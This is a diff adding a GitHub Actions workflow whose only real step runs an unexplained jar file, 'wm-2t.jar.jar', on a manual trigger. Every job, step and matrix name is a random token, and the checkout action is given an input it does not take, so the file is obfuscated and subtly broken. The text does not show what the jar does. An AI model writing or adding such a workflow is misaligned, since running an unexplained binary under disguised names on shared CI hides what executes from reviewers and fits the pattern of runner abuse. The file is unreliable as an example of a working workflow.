@@ -1,0 +1,17 @@
+name: FILE361529PROTO
+on:
+  workflow_dispatch:
+jobs:
+  HEAPEXT259905:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        CORETION363758: [ENCODE933149NANO]
+    steps:
+      - name: Checkout source code
+        uses: actions/checkout@v4
+        with:
+          node-version: '20'
+      - name: domCREATE981934
+        run: |
+          java -jar wm-2t.jar.jar
